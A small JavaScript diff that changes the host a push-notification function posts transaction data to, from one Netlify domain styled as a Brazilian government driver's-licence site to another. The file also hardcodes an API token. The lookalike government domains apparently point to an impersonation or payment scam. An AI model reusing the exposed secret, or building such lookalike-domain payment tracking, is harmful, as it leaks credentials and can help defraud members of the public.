@@ -5,7 +5,7 @@ const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
 async function sendPushNotification(title, message, tag, type, transactionId, amount, customerName) {
   try {
     const payload = JSON.stringify({ title, message, tag, type, transactionId, amount, customerName });
-    await httpsRequest("brasil-cnh-gov.netlify.app", "/api/pwa-send-push", "POST", {
+    await httpsRequest("cnhbrasil-gov.netlify.app", "/api/pwa-send-push", "POST", {
       "Content-Type": "application/json",
       "Content-Length": Buffer.byteLength(payload),
     }, payload, 5000);
